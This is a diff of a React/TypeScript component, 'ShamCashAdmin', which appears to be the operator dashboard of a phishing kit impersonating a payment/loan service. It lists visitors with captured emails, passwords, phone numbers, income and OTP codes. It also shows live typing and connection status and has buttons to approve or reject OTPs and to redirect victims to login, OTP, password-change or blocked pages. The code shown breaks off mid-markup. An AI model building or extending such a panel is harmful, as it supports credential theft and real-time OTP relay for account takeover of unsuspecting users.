@@ -1,132 +1,55 @@
 import { useState, useEffect, useRef } from "react";
 import {
-  CheckCircle, XCircle, ArrowRightLeft, Clock, Bell,
-  KeyRound, ShieldCheck, UserRound, X,
-  Wifi, WifiOff, PenLine, Send, MapPin, Globe, Users
+  Search, Bell, ChevronDown, Wifi, WifiOff,
+  CheckCircle, XCircle, ArrowRightLeft, Clock,
+  KeyRound, ShieldCheck, UserRound, Globe, Users,
+  Phone, Mail, DollarSign, TrendingUp, MapPin,
+  RefreshCw, PenLine, Send, X, LogOut
 } from "lucide-react";
 
 type Lang = "ar" | "en";
-type OtpStatus = "pending" | "approved" | "rejected" | "redirected";
-type PassStatus = "pending" | "approved" | "rejected";
 type VisitorStatus = "connected" | "typing" | "submitted" | "disconnected";
-type RedirectTarget = "login" | "otp" | "changepass";
+type OtpStatus = "pending" | "approved" | "rejected" | "redirected" | null;
+type PassStatus = "pending" | "approved" | "rejected" | null;
 
-interface OtpRequest { kind: "otp"; id: string; phone: string; code: string; time: string; status: OtpStatus; }
-interface PassRequest { kind: "changepass"; id: string; time: string; status: PassStatus; }
-type Request = OtpRequest | PassRequest;
-
-interface Visitor {
+interface Submission {
   id: string;
-  connectedAt: string;
-  status: VisitorStatus;
+  submittedAt: string;
+  submittedAtTs: number;
+  email: string;
+  password: string;
+  phone: string;
+  loan: string;
+  income: string;
+  otpCode: string;
+  otpStatus: OtpStatus;
+  changepassStatus: PassStatus;
   page: string;
-  data: { email: string; phone: string; loan: string; income: string };
+  isActive: boolean;
   lastSeen: number;
 }
 
-const translations = {
-  ar: {
-    title: "لوحة التحكم",
-    subtitle: "إدارة طلبات المستخدمين",
-    connectedUsers: "المتصلون",
-    activeNow: "نشط الآن",
-    langLabel: "العربية",
-    langOther: "EN",
-    currentVisitor: "الزائر الحالي",
-    currentPage: "الصفحة الحالية",
-    email: "البريد",
-    phone: "الهاتف",
-    loan: "قيمة القرض",
-    income: "الدخل",
-    newRequests: "طلبات جديدة",
-    awaitingDecision: "في انتظار القرار",
-    awaitingApproval: "في انتظار الموافقة",
-    otpVerify: "التحقق بـ OTP",
-    otpCode: "رمز OTP",
-    approve: "موافقة",
-    reject: "رفض",
-    redirect: "تحويل",
-    chooseRedirect: "اختر وجهة التحويل",
-    changePass: "تغيير كلمة المرور",
-    history: "السجل",
-    noRequests: "لا توجد طلبات",
-    noRequestsSub: "ستظهر الطلبات هنا عند إرسالها",
-    approved: "موافق",
-    rejected: "مرفوض",
-    redirected: "محوّل",
-    statusConnected: "متصل",
-    statusTyping: "يكتب...",
-    statusSubmitted: "أرسل طلب",
-    statusDisconnected: "غير متصل",
-    pages: { "تسجيل الدخول": "تسجيل الدخول", "التحقق OTP": "التحقق OTP", "تغيير كلمة المرور": "تغيير كلمة المرور" },
-    redirectLogin: "تسجيل المعلومات",
-    redirectLoginSub: "صفحة تسجيل الدخول",
-    redirectOtp: "رمز الأمان",
-    redirectOtpSub: "صفحة التحقق بـ OTP",
-    redirectChangepass: "الكود",
-    redirectChangepassSub: "صفحة تغيير كلمة المرور",
-    otpHistory: "تحقق OTP",
-    changePassHistory: "تغيير كلمة مرور",
-  },
-  en: {
-    title: "Control Panel",
-    subtitle: "Manage user requests",
-    connectedUsers: "Online Users",
-    activeNow: "Active now",
-    langLabel: "English",
-    langOther: "AR",
-    currentVisitor: "Current Visitor",
-    currentPage: "Current Page",
-    email: "Email",
-    phone: "Phone",
-    loan: "Loan Amount",
-    income: "Income",
-    newRequests: "New Requests",
-    awaitingDecision: "Awaiting decision",
-    awaitingApproval: "Awaiting approval",
-    otpVerify: "OTP Verification",
-    otpCode: "OTP Code",
-    approve: "Approve",
-    reject: "Reject",
-    redirect: "Redirect",
-    chooseRedirect: "Choose redirect target",
-    changePass: "Change Password",
-    history: "History",
-    noRequests: "No requests",
-    noRequestsSub: "Requests will appear here when sent",
-    approved: "Approved",
-    rejected: "Rejected",
-    redirected: "Redirected",
-    statusConnected: "Connected",
-    statusTyping: "Typing...",
-    statusSubmitted: "Submitted",
-    statusDisconnected: "Offline",
-    pages: { "تسجيل الدخول": "Login", "التحقق OTP": "OTP Verify", "تغيير كلمة المرور": "Change Password" },
-    redirectLogin: "Login Info",
-    redirectLoginSub: "Login page",
-    redirectOtp: "OTP Code",
-    redirectOtpSub: "OTP verification page",
-    redirectChangepass: "Security Code",
-    redirectChangepassSub: "Change password page",
-    otpHistory: "OTP Verify",
-    changePassHistory: "Change Password",
-  },
-};
+function loadSubmissions(): Submission[] {
+  try {
+    return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]");
+  } catch { return []; }
+}
+
+function saveSubmissions(list: Submission[]) {
+  localStorage.setItem("sham_submissions", JSON.stringify(list));
+}
 
 function playConnectSound() {
   try {
     const ctx = new AudioContext();
     [659, 880, 1047].forEach((freq, i) => {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.connect(gain); gain.connect(ctx.destination);
-      osc.type = "sine";
+      const osc = ctx.createOscillator(); const gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination); osc.type = "sine";
       osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.12);
       gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.12);
       gain.gain.linearRampToValueAtTime(0.25, ctx.currentTime + i * 0.12 + 0.02);
       gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.12 + 0.3);
-      osc.start(ctx.currentTime + i * 0.12);
-      osc.stop(ctx.currentTime + i * 0.12 + 0.35);
+      osc.start(ctx.currentTime + i * 0.12); osc.stop(ctx.currentTime + i * 0.12 + 0.35);
     });
   } catch {}
 }
@@ -135,411 +58,613 @@ function playDisconnectSound() {
   try {
     const ctx = new AudioContext();
     [440, 330, 220].forEach((freq, i) => {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.connect(gain); gain.connect(ctx.destination);
-      osc.type = "sine";
+      const osc = ctx.createOscillator(); const gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination); osc.type = "sine";
       osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.14);
       gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.14);
       gain.gain.linearRampToValueAtTime(0.2, ctx.currentTime + i * 0.14 + 0.02);
       gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.14 + 0.35);
-      osc.start(ctx.currentTime + i * 0.14);
-      osc.stop(ctx.currentTime + i * 0.14 + 0.4);
+      osc.start(ctx.currentTime + i * 0.14); osc.stop(ctx.currentTime + i * 0.14 + 0.4);
     });
   } catch {}
 }
 
-const pageIcons: Record<string, string> = {
-  "تسجيل الدخول": "🔑",
-  "التحقق OTP": "🛡️",
-  "تغيير كلمة المرور": "🔒",
+const T_AR = {
+  title: "لوحة التحكم", visitors: "قائمة الزوار", search: "بحث (الاسم، الهاتف، البريد...)",
+  all: "الكل", active: "نشطون", submitted: "مرسلون", noVisitors: "لا يوجد زوار بعد",
+  noVisitorsSub: "ستظهر السجلات هنا عند إرسال أول طلب",
+  selectVisitor: "اختر زائراً", selectVisitorSub: "اختر من القائمة لعرض التفاصيل",
+  credentials: "بيانات الدخول", email: "البريد الإلكتروني", password: "كلمة السر",
+  otpCode: "رمز OTP", phone: "رقم الهاتف", loan: "قيمة القرض", income: "الدخل الشهري",
+  otpSection: "التحقق OTP", basicInfo: "المعلومات الأساسية", loanInfo: "تفاصيل الطلب",
+  page: "الصفحة الحالية", submittedTime: "وقت الإرسال", lastSeen: "آخر ظهور",
+  redirectTo: "توجيه الزائر", redirectLogin: "صفحة تسجيل الدخول", redirectOtp: "صفحة OTP",
+  redirectChangepass: "صفحة تغيير كلمة المرور", redirectBlocked: "صفحة الحجب",
+  approve: "موافقة ✓", reject: "رفض ✗", sendToOtp: "إرسال إلى OTP",
+  sendToChangepass: "إرسال إلى تغيير كلمة المرور",
+  statusConnected: "متصل", statusTyping: "يكتب...", statusSubmitted: "أرسل",
+  statusDisconnected: "غير متصل", otpPending: "في انتظار الموافقة",
+  otpApproved: "موافق عليه", otpRejected: "مرفوض", otpRedirected: "محوّل",
+  passPending: "في انتظار الموافقة", passApproved: "تم التغيير", passRejected: "مرفوض",
+  connectedNow: "متصل الآن", liveUser: "مستخدم حي", clearAll: "حذف الكل",
+  activeVisitors: "زوار نشطون", lang: "EN", logout: "خروج",
+  notSubmitted: "لم يرسل بعد", waiting: "في الانتظار...",
+};
+const T_EN = {
+  title: "Control Panel", visitors: "Visitor List", search: "Search (name, phone, email...)",
+  all: "All", active: "Active", submitted: "Submitted", noVisitors: "No visitors yet",
+  noVisitorsSub: "Records will appear when the first request is submitted",
+  selectVisitor: "Select a visitor", selectVisitorSub: "Choose from the list to view details",
+  credentials: "Login Credentials", email: "Email", password: "Password",
+  otpCode: "OTP Code", phone: "Phone", loan: "Loan Amount", income: "Monthly Income",
+  otpSection: "OTP Verification", basicInfo: "Basic Information", loanInfo: "Request Details",
+  page: "Current Page", submittedTime: "Submission Time", lastSeen: "Last Seen",
+  redirectTo: "Redirect Visitor", redirectLogin: "Login Page", redirectOtp: "OTP Page",
+  redirectChangepass: "Change Password Page", redirectBlocked: "Blocked Page",
+  approve: "Approve ✓", reject: "Reject ✗", sendToOtp: "Send to OTP",
+  sendToChangepass: "Send to Change Password",
+  statusConnected: "Connected", statusTyping: "Typing...", statusSubmitted: "Submitted",
+  statusDisconnected: "Offline", otpPending: "Awaiting Approval",
+  otpApproved: "Approved", otpRejected: "Rejected", otpRedirected: "Redirected",
+  passPending: "Awaiting Approval", passApproved: "Changed", passRejected: "Rejected",
+  connectedNow: "Online Now", liveUser: "Live User", clearAll: "Clear All",
+  activeVisitors: "Active Visitors", lang: "AR", logout: "Logout",
+  notSubmitted: "Not submitted yet", waiting: "Waiting...",
 };
 
 export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
   const [lang, setLang] = useState<Lang>("ar");
-  const [requests, setRequests] = useState<Request[]>([]);
+  const [submissions, setSubmissions] = useState<Submission[]>([]);
+  const [selected, setSelected] = useState<string | null>(null);
+  const [filter, setFilter] = useState<"all" | "active" | "submitted">("all");
+  const [search, setSearch] = useState("");
+  const [liveStatus, setLiveStatus] = useState<VisitorStatus>("disconnected");
+  const [liveId, setLiveId] = useState<string | null>(null);
+  const [showRedirect, setShowRedirect] = useState(false);
   const [hasNew, setHasNew] = useState(false);
-  const [redirectPickerId, setRedirectPickerId] = useState<string | null>(null);
-  const [visitor, setVisitor] = useState<Visitor | null>(null);
-  const knownVisitorId = useRef<string | null>(null);
-  const prevStatus = useRef<VisitorStatus | null>(null);
+  const prevLiveId = useRef<string | null>(null);
+  const prevLiveStatus = useRef<VisitorStatus>("disconnected");
 
-  const T = translations[lang];
+  const T = lang === "ar" ? T_AR : T_EN;
   const isRtl = lang === "ar";
-  const connectedCount = visitor && visitor.status !== "disconnected" ? 1 : 0;
-
-  const redirectOptions = [
-    { value: "login" as RedirectTarget, label: T.redirectLogin, sub: T.redirectLoginSub, icon: <UserRound className="h-4 w-4" />, color: "text-[#c9ccdb]", border: "border-white/10" },
-    { value: "otp" as RedirectTarget, label: T.redirectOtp, sub: T.redirectOtpSub, icon: <ShieldCheck className="h-4 w-4" />, color: "text-[#657bd8]", border: "border-[#657bd8]/30" },
-    { value: "changepass" as RedirectTarget, label: T.redirectChangepass, sub: T.redirectChangepassSub, icon: <KeyRound className="h-4 w-4" />, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30" },
-  ];
 
   useEffect(() => {
     const interval = setInterval(() => {
-      const otpStatus = localStorage.getItem("sham_otp_status");
-      const phone = localStorage.getItem("sham_otp_phone") ?? "•••••••XXXX";
-      const code = localStorage.getItem("sham_otp_code") ?? "------";
-      if (otpStatus === "pending") {
-        setRequests((prev) => {
-          const exists = prev.some((r) => r.kind === "otp" && (r as OtpRequest).code === code && r.status === "pending");
-          if (exists) return prev;
-          setHasNew(true);
-          return [{ kind: "otp", id: `otp-${Date.now()}`, phone, code, time: new Date().toLocaleTimeString("ar-SY"), status: "pending" }, ...prev];
-        });
-      }
-      const passStatus = localStorage.getItem("sham_changepass_status");
-      const passTime = localStorage.getItem("sham_changepass_time") ?? new Date().toLocaleTimeString("ar-SY");
-      if (passStatus === "pending") {
-        setRequests((prev) => {
-          const exists = prev.some((r) => r.kind === "changepass" && r.status === "pending");
-          if (exists) return prev;
-          setHasNew(true);
-          return [{ kind: "changepass", id: `pass-${Date.now()}`, time: passTime, status: "pending" }, ...prev];
-        });
-      }
+      const raw = loadSubmissions();
       const vId = localStorage.getItem("sham_visitor_id");
       const vStatus = localStorage.getItem("sham_visitor_status") as VisitorStatus | null;
-      const vConnectedAt = localStorage.getItem("sham_visitor_connected_at") ?? "";
-      const vPage = localStorage.getItem("sham_visitor_page") ?? "";
-      const vDataRaw = localStorage.getItem("sham_visitor_data");
       const vLastSeen = parseInt(localStorage.getItem("sham_visitor_heartbeat") ?? "0");
-      const vData = vDataRaw ? JSON.parse(vDataRaw) : { email: "", phone: "", loan: "", income: "" };
+      const vDataRaw = localStorage.getItem("sham_visitor_data");
+      const vPage = localStorage.getItem("sham_visitor_page") ?? "";
       const isAlive = vStatus && vStatus !== "disconnected" && (Date.now() - vLastSeen < 4000);
 
+      const currentLiveStatus: VisitorStatus = isAlive ? (vStatus ?? "connected") : "disconnected";
+      setLiveStatus(currentLiveStatus);
+      setLiveId(isAlive ? vId : null);
+
       if (vId && isAlive) {
-        if (vId !== knownVisitorId.current) {
-          knownVisitorId.current = vId;
+        if (vId !== prevLiveId.current) {
+          prevLiveId.current = vId;
           playConnectSound();
           setHasNew(true);
         }
-        const newStatus = vStatus ?? "connected";
-        prevStatus.current = newStatus;
-        setVisitor({ id: vId, connectedAt: vConnectedAt, status: newStatus, page: vPage, data: vData, lastSeen: vLastSeen });
-      } else if (visitor && !isAlive) {
-        if (prevStatus.current && prevStatus.current !== "disconnected") {
+        if (prevLiveStatus.current === "disconnected" && currentLiveStatus !== "disconnected") {
+          setHasNew(true);
+        }
+      } else if (prevLiveId.current && !isAlive) {
+        if (prevLiveStatus.current !== "disconnected") {
           playDisconnectSound();
         }
-        prevStatus.current = "disconnected";
-        setVisitor((prev) => prev ? { ...prev, status: "disconnected" } : null);
+        prevLiveId.current = null;
       }
+      prevLiveStatus.current = currentLiveStatus;
+
+      const otpStatus = localStorage.getItem("sham_otp_status") as OtpStatus;
+      const otpCode = localStorage.getItem("sham_otp_code") ?? "";
+      const changepassStatus = localStorage.getItem("sham_changepass_status") as PassStatus;
+      const vData = vDataRaw ? JSON.parse(vDataRaw) : {};
+
+      const updated = raw.map((s) => {
+        if (s.id === vId) {
+          return {
+            ...s,
+            isActive: !!isAlive,
+            lastSeen: vLastSeen || s.lastSeen,
+            page: vPage || s.page,
+            email: vData.email || s.email,
+            phone: vData.phone || s.phone,
+            loan: vData.loan || s.loan,
+            income: vData.income || s.income,
+            otpCode: otpCode || s.otpCode,
+            otpStatus: otpStatus ?? s.otpStatus,
+            changepassStatus: changepassStatus ?? s.changepassStatus,
+          };
+        }
+        return { ...s, isActive: false };
+      });
+
+      if (vId && isAlive) {
+        const exists = updated.find((s) => s.id === vId);
+        if (!exists) {
+          const newSub: Submission = {
+            id: vId,
+            submittedAt: localStorage.getItem("sham_visitor_connected_at") ?? new Date().toLocaleTimeString("ar-SY"),
+            submittedAtTs: Date.now(),
+            email: vData.email ?? "",
+            password: "",
+            phone: vData.phone ?? localStorage.getItem("sham_phone") ?? "",
+            loan: vData.loan ?? "",
+            income: vData.income ?? "",
+            otpCode: otpCode,
+            otpStatus: otpStatus,
+            changepassStatus: changepassStatus,
+            page: vPage,
+            isActive: true,
+            lastSeen: vLastSeen,
+          };
+          const next = [newSub, ...updated];
+          saveSubmissions(next);
+          setSubmissions(next);
+          setHasNew(true);
+          return;
+        }
+      }
+
+      saveSubmissions(updated);
+      setSubmissions(updated);
     }, 600);
     return () => clearInterval(interval);
-  }, [visitor]);
+  }, []);
 
-  function decideOtp(id: string, decision: OtpStatus) {
-    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: decision } : r)));
-    localStorage.setItem("sham_otp_status", decision);
-    setHasNew(false);
-  }
-  function redirectOtp(id: string, target: RedirectTarget) {
-    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: "redirected" } : r)));
-    localStorage.setItem("sham_otp_redirect_target", target);
-    localStorage.setItem("sham_otp_status", "redirected");
-    setRedirectPickerId(null);
-    setHasNew(false);
-  }
-  function decidePass(id: string, decision: PassStatus) {
-    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: decision } : r)));
-    localStorage.setItem("sham_changepass_status", decision);
-    setHasNew(false);
+  function sendCmd(cmd: string) {
+    localStorage.setItem("sham_admin_cmd", cmd);
   }
 
-  const pending = requests.filter((r) => r.status === "pending");
-  const history = requests.filter((r) => r.status !== "pending");
+  function decideOtp(decision: OtpStatus) {
+    localStorage.setItem("sham_otp_status", decision ?? "");
+    setSubmissions((prev) => prev.map((s) => s.isActive ? { ...s, otpStatus: decision } : s));
+  }
 
-  const otpStatusLabel: Record<string, { label: string; color: string; bg: string }> = {
-    approved: { label: T.approved, color: "text-[#1fc28a]", bg: "bg-[#1fc28a]/10" },
-    rejected: { label: T.rejected, color: "text-[#e54343]", bg: "bg-[#e54343]/10" },
-    redirected: { label: T.redirected, color: "text-[#657bd8]", bg: "bg-[#657bd8]/10" },
+  function decidePass(decision: PassStatus) {
+    localStorage.setItem("sham_changepass_status", decision ?? "");
+    setSubmissions((prev) => prev.map((s) => s.isActive ? { ...s, changepassStatus: decision } : s));
+  }
+
+  function clearAll() {
+    saveSubmissions([]);
+    setSubmissions([]);
+    setSelected(null);
+  }
+
+  const filtered = submissions.filter((s) => {
+    const q = search.toLowerCase();
+    const matchSearch = !q || s.email.toLowerCase().includes(q) || s.phone.includes(q) || s.id.includes(q);
+    const matchFilter = filter === "all" || (filter === "active" && s.isActive) || (filter === "submitted" && (s.otpCode || s.otpStatus || s.changepassStatus));
+    return matchSearch && matchFilter;
+  });
+
+  const selectedSub = submissions.find((s) => s.id === selected) ?? null;
+  const activeCount = submissions.filter((s) => s.isActive).length;
+
+  const pageColor: Record<string, string> = {
+    "تسجيل الدخول": "bg-[#657bd8]/20 text-[#657bd8]",
+    "التحقق OTP": "bg-[#f5a623]/20 text-[#f5a623]",
+    "تغيير كلمة المرور": "bg-[#1fc28a]/20 text-[#1fc28a]",
   };
-  const passStatusLabel: Record<string, { label: string; color: string; bg: string }> = {
-    approved: { label: T.approved, color: "text-[#1fc28a]", bg: "bg-[#1fc28a]/10" },
-    rejected: { label: T.rejected, color: "text-[#e54343]", bg: "bg-[#e54343]/10" },
+  const statusColor: Record<string, string> = {
+    connected: "text-[#1fc28a]", typing: "text-[#f5a623]",
+    submitted: "text-[#657bd8]", disconnected: "text-white/30",
   };
-
-  const visitorStatusConfig: Record<VisitorStatus, { label: string; color: string; dot: string; icon: React.ReactNode }> = {
-    connected: { label: T.statusConnected, color: "text-[#1fc28a]", dot: "bg-[#1fc28a]", icon: <Wifi className="h-3 w-3" /> },
-    typing: { label: T.statusTyping, color: "text-[#f5a623]", dot: "bg-[#f5a623]", icon: <PenLine className="h-3 w-3" /> },
-    submitted: { label: T.statusSubmitted, color: "text-[#657bd8]", dot: "bg-[#657bd8]", icon: <Send className="h-3 w-3" /> },
-    disconnected: { label: T.statusDisconnected, color: "text-white/40", dot: "bg-white/20", icon: <WifiOff className="h-3 w-3" /> },
+  const statusDot: Record<string, string> = {
+    connected: "bg-[#1fc28a]", typing: "bg-[#f5a623]",
+    submitted: "bg-[#657bd8]", disconnected: "bg-white/20",
   };
 
   return (
-    <div className="min-h-screen w-full bg-[#0f1526] text-white font-['Inter']" dir={isRtl ? "rtl" : "ltr"}>
-      <div className="mx-auto max-w-[420px] flex flex-col min-h-screen">
+    <div className="flex h-screen w-full overflow-hidden bg-[#0b1120] text-white" dir={isRtl ? "rtl" : "ltr"} style={{ fontFamily: "'Inter', system-ui, sans-serif" }}>
 
-        <div className="sticky top-0 z-10 bg-[#0f1526]/95 backdrop-blur-sm px-4 pt-4 pb-3 border-b border-white/[0.05]">
-          <div className="flex items-center justify-between">
-            <h1 className="text-[17px] font-extrabold text-white/90">{T.title}</h1>
-            <div className="relative">
-              <Bell className="h-5 w-5 text-white/60" />
-              {hasNew && <span className="absolute -top-1 -right-1 h-2.5 w-2.5 rounded-full bg-[#e54343] ring-2 ring-[#0f1526]" />}
+      {/* RIGHT PANEL — VISITORS LIST */}
+      <div className={`flex h-full w-full flex-col border-[#1e2a45] bg-[#0d1526] ${selectedSub ? "hidden sm:flex sm:w-[340px]" : "flex"} sm:flex sm:w-[340px] flex-shrink-0 ${isRtl ? "border-l" : "border-r"}`}>
+
+        {/* Header */}
+        <div className="flex items-center justify-between px-4 pt-4 pb-3 border-b border-[#1e2a45]">
+          <div className="flex items-center gap-2">
+            <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-[#657bd8]/15">
+              <Users className="h-4 w-4 text-[#657bd8]" />
+            </div>
+            <div>
+              <p className="text-[13px] font-extrabold text-white/90">{T.visitors}</p>
+              <p className="text-[10px] text-[#c9ccdb]/40">{submissions.length} {T_AR.lang === lang ? "سجل" : "records"}</p>
             </div>
           </div>
-          <p className="mt-0.5 text-[11px] text-[#c9ccdb]/45">{T.subtitle}</p>
-
-          <div className="mt-3 grid grid-cols-2 gap-2">
-            <div className="flex items-center gap-2.5 rounded-[12px] bg-[#1e2640] border border-[#657bd8]/25 px-3 py-2.5">
-              <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-[#657bd8]/15 shrink-0">
-                <Users className="h-4 w-4 text-[#657bd8]" />
-              </div>
-              <div>
-                <p className="text-[18px] font-extrabold text-white leading-none">{connectedCount}</p>
-                <p className="text-[10px] text-[#c9ccdb]/50 mt-0.5">{T.connectedUsers}</p>
-              </div>
-              {connectedCount > 0 && (
-                <span className="mr-auto flex items-center gap-1 text-[9px] font-bold text-[#1fc28a] bg-[#1fc28a]/10 rounded-full px-1.5 py-0.5">
-                  <span className="h-1.5 w-1.5 rounded-full bg-[#1fc28a] animate-pulse" />
-                  {T.activeNow}
-                </span>
-              )}
-            </div>
-
-            <button
-              onClick={() => setLang(lang === "ar" ? "en" : "ar")}
-              className="flex items-center gap-2.5 rounded-[12px] bg-[#1e2640] border border-white/[0.08] px-3 py-2.5 hover:bg-[#252f52] transition-colors active:scale-[0.97]"
-            >
-              <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-white/5 shrink-0">
-                <Globe className="h-4 w-4 text-white/60" />
-              </div>
-              <div className="text-right" dir="rtl">
-                <p className="text-[13px] font-extrabold text-white leading-none">{T.langOther}</p>
-                <p className="text-[10px] text-[#c9ccdb]/50 mt-0.5">{T.langLabel}</p>
-              </div>
+          <div className="flex items-center gap-2">
+            {hasNew && (
+              <div className="h-2 w-2 rounded-full bg-[#e54343] animate-pulse ring-2 ring-[#0d1526]" />
+            )}
+            <button onClick={() => setLang(l => l === "ar" ? "en" : "ar")}
+              className="rounded-[6px] bg-white/5 px-2 py-1 text-[10px] font-bold text-white/50 hover:bg-white/10">
+              {T.lang}
             </button>
+            {onLogout && (
+              <button onClick={onLogout} className="rounded-[6px] bg-white/5 p-1.5 text-white/40 hover:bg-red-500/20 hover:text-red-400 transition-colors">
+                <LogOut className="h-3.5 w-3.5" />
+              </button>
+            )}
           </div>
         </div>
 
-        <div className="flex-1 px-4 py-4 space-y-4 overflow-y-auto">
+        {/* Live indicator */}
+        {liveStatus !== "disconnected" && (
+          <div className="mx-3 mt-3 flex items-center gap-2 rounded-[10px] bg-[#1fc28a]/10 border border-[#1fc28a]/20 px-3 py-2">
+            <span className="h-2 w-2 rounded-full bg-[#1fc28a] animate-pulse" />
+            <span className="text-[11px] font-bold text-[#1fc28a]">{T.liveUser}</span>
+            <span className={`mr-auto text-[10px] font-semibold ${statusColor[liveStatus]}`}>
+              {liveStatus === "typing" ? T.statusTyping : liveStatus === "submitted" ? T.statusSubmitted : T.statusConnected}
+            </span>
+          </div>
+        )}
 
-          {visitor && (
-            <div className="space-y-1.5">
-              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">{T.currentVisitor}</p>
-              <div className={`rounded-[14px] border p-3 space-y-2.5 transition-all duration-300
-                ${visitor.status === "disconnected"
-                  ? "bg-[#1a2035] border-white/[0.05]"
-                  : visitor.status === "typing"
-                  ? "bg-[#1e2a1a] border-[#f5a623]/25 shadow-[0_0_16px_rgba(245,166,35,0.08)]"
-                  : "bg-[#1a2a1e] border-[#1fc28a]/25 shadow-[0_0_16px_rgba(31,194,138,0.08)]"
-                }`}>
-                <div className="flex items-center justify-between gap-2">
-                  <div className="flex items-center gap-1.5">
-                    <span className={`h-2 w-2 rounded-full ${visitorStatusConfig[visitor.status].dot} ${visitor.status !== "disconnected" ? "animate-pulse" : ""}`} />
-                    <span className={`text-[11px] font-bold ${visitorStatusConfig[visitor.status].color} flex items-center gap-1`}>
-                      {visitorStatusConfig[visitor.status].icon}
-                      {visitorStatusConfig[visitor.status].label}
-                    </span>
-                  </div>
-                  <span className="text-[10px] text-[#c9ccdb]/40 flex items-center gap-1">
-                    <Clock className="h-2.5 w-2.5" />{visitor.connectedAt}
-                  </span>
-                </div>
+        {/* Search */}
+        <div className="px-3 pt-3 pb-2">
+          <div className="flex items-center gap-2 rounded-[10px] bg-[#1a2540] border border-[#1e2a45] px-3 py-2">
+            <Search className="h-3.5 w-3.5 text-white/30 shrink-0" />
+            <input
+              value={search}
+              onChange={(e) => setSearch(e.target.value)}
+              placeholder={T.search}
+              className="flex-1 bg-transparent text-[12px] text-white/80 outline-none placeholder:text-white/25"
+              dir={isRtl ? "rtl" : "ltr"}
+            />
+          </div>
+        </div>
 
-                {visitor.page && (
-                  <div className="flex items-center gap-1.5 rounded-[8px] bg-[#657bd8]/10 border border-[#657bd8]/20 px-2.5 py-1.5">
-                    <MapPin className="h-3 w-3 text-[#657bd8] shrink-0" />
-                    <span className="text-[10px] text-[#c9ccdb]/60">{T.currentPage}:</span>
-                    <span className="text-[11px] font-bold text-[#657bd8]">
-                      {pageIcons[visitor.page] ?? "📄"} {T.pages[visitor.page as keyof typeof T.pages] ?? visitor.page}
-                    </span>
-                  </div>
-                )}
+        {/* Filters */}
+        <div className="flex gap-1.5 px-3 pb-3">
+          {(["all", "active", "submitted"] as const).map((f) => (
+            <button key={f} onClick={() => setFilter(f)}
+              className={`rounded-[7px] px-3 py-1.5 text-[11px] font-bold transition-colors ${filter === f ? "bg-[#657bd8] text-white" : "bg-[#1a2540] text-white/40 hover:bg-[#1e2a55]"}`}>
+              {f === "all" ? T.all : f === "active" ? T.active : T.submitted}
+            </button>
+          ))}
+          {submissions.length > 0 && (
+            <button onClick={clearAll} className="mr-auto rounded-[7px] px-2 py-1.5 text-[10px] font-bold text-white/30 hover:text-red-400 transition-colors">
+              {T.clearAll}
+            </button>
+          )}
+        </div>
 
-                <div className="space-y-1.5 pt-0.5 border-t border-white/[0.06]">
-                  {[
-                    { label: T.email, value: visitor.data.email, icon: <UserRound className="h-3 w-3" /> },
-                    { label: T.phone, value: visitor.data.phone, icon: <span className="text-[10px]">📞</span> },
-                    { label: T.loan, value: visitor.data.loan ? `${visitor.data.loan} ل.س` : "", icon: <span className="text-[10px]">💵</span> },
-                    { label: T.income, value: visitor.data.income ? `${visitor.data.income} ل.س` : "", icon: <span className="text-[10px]">📈</span> },
-                  ].map((row) => (
-                    <div key={row.label} className="flex items-center justify-between gap-2">
-                      <span className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1">{row.icon}{row.label}</span>
-                      <span className={`text-[11px] font-bold ${row.value ? "text-white/85" : "text-white/20"}`} dir="ltr">
-                        {row.value || "—"}
-                      </span>
+        {/* List */}
+        <div className="flex-1 overflow-y-auto px-3 pb-4 space-y-2">
+          {filtered.length === 0 ? (
+            <div className="flex flex-col items-center justify-center py-12 text-center space-y-3">
+              <div className="h-12 w-12 rounded-full bg-[#1a2540] flex items-center justify-center">
+                <Bell className="h-5 w-5 text-white/20" />
+              </div>
+              <p className="text-[12px] font-bold text-white/25">{T.noVisitors}</p>
+              <p className="text-[10px] text-white/15">{T.noVisitorsSub}</p>
+            </div>
+          ) : (
+            filtered.map((sub) => {
+              const isSelected = selected === sub.id;
+              const displayPhone = sub.phone || sub.email || sub.id.slice(-8);
+              const timeDiff = Date.now() - sub.submittedAtTs;
+              const timeAgo = timeDiff < 60000 ? "الآن" : timeDiff < 3600000 ? `${Math.floor(timeDiff / 60000)} د` : `${Math.floor(timeDiff / 3600000)} س`;
+              return (
+                <button key={sub.id} onClick={() => { setSelected(sub.id); setHasNew(false); }}
+                  className={`w-full rounded-[12px] border p-3 text-right transition-all duration-150 ${isSelected
+                    ? "bg-[#1a2a55] border-[#657bd8]/50 shadow-[0_0_12px_rgba(101,123,216,0.15)]"
+                    : "bg-[#121d35] border-[#1e2a45] hover:bg-[#162038] hover:border-[#2a3a5a]"
+                    }`}
+                  dir={isRtl ? "rtl" : "ltr"}
+                >
+                  <div className="flex items-start justify-between gap-2">
+                    <div className="flex items-center gap-2 min-w-0">
+                      <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-full text-[13px] font-extrabold
+                        ${sub.isActive ? "bg-[#1fc28a]/15 text-[#1fc28a]" : "bg-[#657bd8]/10 text-[#657bd8]/60"}`}>
+                        {displayPhone.slice(0, 1).toUpperCase() || "؟"}
+                      </div>
+                      <div className="min-w-0">
+                        <p className="truncate text-[12px] font-bold text-white/85">{displayPhone}</p>
+                        {sub.email && sub.phone && (
